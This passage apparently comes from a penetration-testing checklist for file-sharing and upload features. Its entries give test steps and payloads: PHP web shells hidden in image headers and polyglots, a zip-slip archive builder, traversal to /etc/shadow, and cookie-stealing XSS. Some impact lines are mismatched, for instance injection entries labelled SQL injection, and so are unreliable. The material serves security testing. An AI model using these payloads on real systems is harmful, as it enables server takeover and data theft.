**Test Steps:** 1. Access shared link API endpoint 2. Check response for owner details 3. Look for internal file paths or IDs 4. Check if file metadata reveals sensitive information

**Expected Result:** Application must minimize metadata exposure in shared link responses

**Payload Example:**

```
GET /api/shares/abc123 revealing owner email / internal path / server info
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-075 — Access After Permission Revocation
**Test Category:** WSTG-ATHZ-04 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Create share link and access it 2. Revoke sharing permission 3. Attempt to access cached version of shared content 4. Check if CDN still serves the file

**Expected Result:** Application must immediately invalidate all access upon share revocation including CDN cache

**Payload Example:**

```
Access /share/abc123 after owner revokes sharing and check if content still accessible
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-076 — Share Link Brute Force
**Test Category:** WSTG-ATHN-03 / Brute Force · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Analyze share token format and length 2. Set up brute force or dictionary attack 3. Attempt to discover valid share tokens 4. Check for rate limiting on share endpoint

**Expected Result:** Application must implement rate limiting and use sufficiently long random tokens

**Payload Example:**

```
GET /share/{token} with Intruder iterating through token possibilities
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Hydra / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FILE-077 — Share Link Injection for Phishing
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Create share with custom message field 2. Inject HTML/JS in share message 3. Send share notification to victim 4. Check if injected content renders in email or UI

**Expected Result:** Application must sanitize share messages in both UI and email notifications

**Payload Example:**

```
Share message: <a href="http://evil.com">Click here</a> or <script>alert(1)</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis Tools

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-078 — Cross-User Share Link Enumeration
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Collect share link format from own shares 2. Modify identifiers to target other shares 3. Attempt to list all shares for the application 4. Try admin share management endpoints

**Expected Result:** Application must prevent enumeration of share links and enforce per-user access

**Payload Example:**

```
GET /api/shares?user_id=other_user or incrementing share IDs
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / Autorize / cURL

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FILE-079 — Path Traversal in Folder Name
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Create folder with ../ in the name 2. Try ....// and ..%2f variants 3. Create nested folders with traversal sequences 4. Check if files can be accessed outside root

**Expected Result:** Application must sanitize folder names and reject path traversal characters

**Payload Example:**

```
POST /api/folders {name: "../../../etc"} or {name: "....//....//tmp"}
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / cURL / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-080 — IDOR on Folder IDs
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Create folder as User A and note folder ID 2. Login as User B 3. Access User A folder ID 4. Modify or delete User A folders

**Expected Result:** Application must verify folder ownership and authorization for every operation

**Payload Example:**

```
GET /api/folders/12345/contents or DELETE /api/folders/12345 as different user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-081 — Privilege Escalation in Folder Permissions
**Test Category:** WSTG-ATHZ-02 / Privilege Escalation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Identify folder permission model 2. Try to assign higher permissions to self 3. Modify folder owner via API 4. Create folder in restricted parent directory

**Expected Result:** Application must validate permission changes against user role and prevent self-escalation

**Payload Example:**

```
PUT /api/folders/123/permissions {user: "attacker" role: "admin"} as non-admin
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-082 — Recursive Folder Creation DoS
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Create deeply nested folders (1000+ levels) 2. Create thousands of folders at same level 3. Create circular folder references if possible 4. Monitor filesystem and database impact

**Expected Result:** Application must limit folder nesting depth and total folder count per user

**Payload Example:**

```
Script creating /a/a/a/a/... to 1000+ depth levels via API
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Script / Burp Suite / cURL

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-083 — Symlink Attack via Folder Name
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. If application creates filesystem directories from user input 2. Try to create symbolic link references 3. Check if application follows symlinks 4. Attempt to access system directories

**Expected Result:** Application must not create filesystem objects directly from user input and must resolve symlinks

**Payload Example:**

```
Folder name containing symlink target or API manipulation to create symlink
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** cURL / Burp Suite / OS Commands

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-084 — Folder Deletion Cascade Attack
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Move critical shared files into user-controlled folder 2. Delete the folder 3. Check if shared files are permanently deleted 4. Verify backup and recovery mechanisms

**Expected Result:** Application must handle folder deletion carefully and protect shared resources from cascade deletion

**Payload Example:**

```
Move shared files to personal folder then DELETE /api/folders/personal_folder?recursive=true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL

**References:** CWE-840; PortSwigger Business logic

---

## FILE-085 — Folder Name Stored XSS
**Test Category:** WSTG-INPV-02 / Stored XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Create folder with XSS payload in name 2. Navigate to folder listing 3. Check if folder name renders without encoding 4. Test in different contexts (breadcrumbs/tree view)

**Expected Result:** Application must HTML-encode folder names in all display contexts

**Payload Example:**

```
POST /api/folders {name: "<img src=x onerror=alert(document.cookie)>"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-086 — Cross-Tenant Folder Access
**Test Category:** WSTG-ATHZ-04 / Multi-Tenancy · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Folder Organization

**Test Steps:** 1. Identify tenant/organization ID in folder requests 2. Modify tenant ID to access another organization 3. List folder contents of different tenant 4. Create folders in other tenant space

**Expected Result:** Application must enforce strict tenant isolation for all folder operations

**Payload Example:**

```
GET /api/tenants/other-tenant/folders or manipulate X-Tenant-ID header
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-087 — Zip Slip Vulnerability
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Create ZIP with entries containing ../../../ path 2. Upload ZIP for bulk extraction 3. Monitor extracted file locations 4. Check if files are written outside target directory

**Expected Result:** Application must validate and sanitize all archive entry paths before extraction

**Payload Example:**

```
python -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../../var/www/html/shell.php'); z.close()"
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** evilarc / Custom Python / Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-088 — Zip Bomb Upload
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Create zip bomb (small compressed huge decompressed) 2. Upload for bulk processing 3. Monitor disk space and memory 4. Check if extraction limits exist

**Expected Result:** Application must check compression ratio and set extraction size limits

**Payload Example:**

```
42.zip or custom zip bomb with 10MB compressed 10GB decompressed
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Scripts / zip command / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-089 — Bulk Download Authorization Bypass
**Test Category:** WSTG-ATHZ-04 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Initiate bulk download of own files 2. Intercept the request 3. Add file IDs belonging to other users 4. Download and verify if unauthorized files are included

**Expected Result:** Application must verify authorization for each file in bulk download request

**Payload Example:**

```
POST /api/bulk-download {file_ids: [own_id1 other_user_id2 other_user_id3]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-090 — Archive Extraction Path Traversal
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Create TAR/7Z/RAR with traversal entries 2. Upload for extraction 3. Include symlinks in archive pointing to sensitive files 4. Check extracted contents

**Expected Result:** Application must validate archive entries and reject archives with path traversal or symlinks

**Payload Example:**

```
tar containing ../../../../etc/shadow symlink or relative path entries
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** tar / 7z / Custom Scripts / Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-091 — Server Resource Exhaustion via Bulk Operations
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Initiate maximum concurrent bulk uploads 2. Upload archives with thousands of files 3. Request bulk download of all files simultaneously 4. Monitor server resources

**Expected Result:** Application must queue bulk operations and limit concurrent processing

**Payload Example:**

```
Upload 100 ZIP files each containing 10000 small files simultaneously
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Apache JMeter / Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-092 — Bulk Upload Mixed Content Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Create archive with mix of safe and malicious files 2. Upload bulk archive 3. Check if validation fails-open (allows all if one passes) 4. Verify each file is individually validated

**Expected Result:** Application must validate each file individually within bulk uploads

**Payload Example:**

```
ZIP containing 99 safe JPGs and 1 shell.php
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Custom ZIP creator / Burp Suite / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-093 — Bulk Download Data Exfiltration
**Test Category:** WSTG-INFO-05 / Data Leakage · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Check bulk download API for parameter manipulation 2. Request download with wildcard patterns 3. Try to include system files in bulk download 4. Test path parameter injection

**Expected Result:** Application must restrict bulk downloads to authorized user files only

**Payload Example:**

```
POST /api/bulk-download {path: "/../../etc/"} or {pattern: "*"}
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-094 — Concurrent Bulk Operation Race Condition
**Test Category:** WSTG-BUSL-09 / Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bulk Upload / Download

**Test Steps:** 1. Start bulk upload and bulk download simultaneously 2. Check for file corruption 3. Verify integrity of all transferred files 4. Test quota enforcement during concurrent operations

**Expected Result:** Application must handle concurrent operations atomically and maintain data integrity

**Payload Example:**

```
Parallel bulk upload and download of same files using Turbo Intruder
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite Turbo Intruder / JMeter

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FILE-095 — Extension Whitelist Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Identify allowed file extensions 2. Try alternate extensions for same type (.php .php5 .phtml .phar) 3. Try case variations (.PHP .Php .pHp) 4. Test with trailing spaces/dots

**Expected Result:** Application must normalize extensions and check against comprehensive blocklist

**Payload Example:**

```
.php5 .phtml .phar .PhP .php. .php%20 .php::$DATA (Windows)
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite Intruder / SecLists / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-096 — Magic Bytes Spoofing
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Prepend valid magic bytes to malicious file 2. Add JPEG header (FF D8 FF E0) to PHP file 3. Upload with allowed extension 4. Check if server executes despite magic bytes

**Expected Result:** Application must validate both magic bytes and file structure not just header bytes

**Payload Example:**

```
echo -e '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > evil.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Hex Editor / ExifTool / Burp Suite

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-097 — Content-Type Header Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Upload malicious file 2. Intercept and change Content-Type to allowed type 3. Change to application/octet-stream 4. Remove Content-Type header entirely

**Expected Result:** Application must not rely solely on Content-Type header for file type validation

**Payload Example:**

```
Content-Type: image/png with actual content being PHP/JSP/ASP shell code
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-098 — Polyglot File Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Create file valid as both image and script 2. Embed PHP in JPEG EXIF comment 3. Create GIFAR (GIF+JAR) file 4. Upload and verify execution

**Expected Result:** Application must parse and validate entire file structure not just headers

**Payload Example:**

```
GIF89a; <?php system($_GET['cmd']); ?> saved as polyglot.php.gif
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** ExifTool / Custom Scripts / Polyglot tools

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-099 — Null Byte Extension Bypass
**Test Category:** WSTG-INPV-03 / Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Append null byte before safe extension 2. Try URL-encoded null (%00) 3. Try unicode null variations 4. Check server-side processing of null bytes

**Expected Result:** Application must reject filenames containing null bytes

**Payload Example:**

```
file.php%00.jpg or file.php\x00.jpg or file.php\0.jpg
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hex Editor / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-100 — Windows Alternate Data Stream Bypass
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Upload file with ::$DATA appended (Windows servers) 2. Try file.php::$DATA 3. Check if server strips ADS notation 4. Attempt access with and without ADS

**Expected Result:** Application must strip Windows ADS notations from filenames

**Payload Example:**

```
file.php::$DATA or file.php:zone.identifier:$DATA
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / cURL (targeting Windows servers)

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-101 — Double Extension with Misconfigured Server
**Test Category:** WSTG-CONF-03 / Server Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Check server configuration for extension handling 2. Upload file.php.jpg and test if Apache processes as PHP 3. Check for AddHandler directives 4. Test .htaccess override upload

**Expected Result:** Application server must only execute files with explicitly configured extensions

**Payload Example:**

```
file.php.jpg on Apache with AddHandler application/x-httpd-php .php processing both extensions
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Nikto / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-102 — File Content Mismatch Attack
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Upload file with valid extension but mismatched content 2. Upload EXE renamed as .docx 3. Upload JS renamed as .txt 4. Check how application handles content mismatch

**Expected Result:** Application must validate file content matches the declared extension and MIME type

**Payload Example:**

```
Rename malware.exe to document.docx and upload through file type filter
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / file command / CyberChef

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-103 — Unicode Extension Spoofing
**Test Category:** WSTG-INPV-03 / Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Use Unicode right-to-left override character (U+202E) in filename 2. Create filename that appears as .jpg but is .php 3. Upload and check processing 4. Try various Unicode normalization bypasses

**Expected Result:** Application must normalize Unicode in filenames and validate after normalization

**Payload Example:**

```
file[U+202E]gpj.php (displays as filephp.jpg) or file\u202egpj.php
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Hex Editor / Python

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-104 — MIME Type Confusion via Charset
**Test Category:** WSTG-BUSL-08 / File Upload · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Type Validation

**Test Steps:** 1. Set Content-Type with unusual charset 2. Use Content-Type: text/html; charset=utf-7 3. Test if charset affects validation 4. Check if rendered with incorrect charset

**Expected Result:** Application must validate MIME type independently of charset parameter

**Payload Example:**

```
Content-Type: image/jpeg; charset=utf-7 or Content-Type: text/plain; charset=ibm037
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / cURL

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FILE-105 — Quota Bypass via Race Condition
**Test Category:** WSTG-BUSL-09 / Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Upload files until near quota limit 2. Send multiple simultaneous upload requests 3. Check if total exceeds quota 4. Verify quota enforcement under concurrency

**Expected Result:** Application must enforce quotas atomically using database transactions or locks

**Payload Example:**

```
Send 10 parallel uploads of large files when only space for 1 remains
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite Turbo Intruder / JMeter / Custom Scripts

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FILE-106 — Negative File Size Manipulation
**Test Category:** WSTG-INPV-01 / Input Validation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Intercept upload request 2. Modify Content-Length to negative value 3. Modify size parameter if present in metadata 4. Check if quota calculation is corrupted

**Expected Result:** Application must validate file sizes as positive values and verify actual bytes received

**Payload Example:**

```
Content-Length: -1000 or metadata size: -999999
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / cURL

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FILE-107 — Quota Bypass via Versioning
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Upload file within quota 2. Update file repeatedly creating versions 3. Check if versions count against quota 4. Accumulate storage via version history

**Expected Result:** Application must include all versions in quota calculation

**Payload Example:**

```
Upload 10MB file 100 times as updates creating 1GB of versions against 100MB quota
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## FILE-108 — Storage Exhaustion via Temporary Files
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Start large file uploads but abort midway 2. Repeat many times to accumulate temp files 3. Check if temporary files are cleaned up 4. Monitor disk usage growth

**Expected Result:** Application must clean up temporary files on upload failure and set temp storage limits

**Payload Example:**

```
Start upload of 1GB file and abort at 500MB repeated 100 times
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** cURL / Custom Scripts / Server Monitoring

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-109 — Quota Check Bypass via API Manipulation
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Identify quota check API calls 2. Modify quota response to show unlimited space 3. Upload files exceeding actual quota 4. Check if server validates quota independently

**Expected Result:** Application must enforce quota checks server-side independent of client-reported values

**Payload Example:**

```
Modify API response from {quota_remaining: 0} to {quota_remaining: 999999999}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / mitmproxy

**References:** CWE-840; PortSwigger Business logic

---

## FILE-110 — Cross-User Quota Manipulation
**Test Category:** WSTG-ATHZ-02 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Identify quota management API 2. Try to modify another users quota 3. Upload files attributed to another users quota 4. Transfer files to bypass personal quota

**Expected Result:** Application must prevent users from modifying quotas or attributing storage to other users

**Payload Example:**

```
PUT /api/users/other-user/quota {limit: 999999} or POST /api/files {owner: other_user_id}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-111 — Quota Enforcement on File Copy/Move
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Storage Quota Management

**Test Steps:** 1. Copy files within the system 2. Check if copies count against quota 3. Move files between folders and check quota 4. Duplicate files via API to exceed quota

**Expected Result:** Application must update quota for file copies and prevent quota bypass via copy operations

**Payload Example:**

```
POST /api/files/123/copy repeated to exceed quota or bulk copy operations
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL

**References:** CWE-840; PortSwigger Business logic

---

## FILE-112 — Shared Storage Quota Abuse
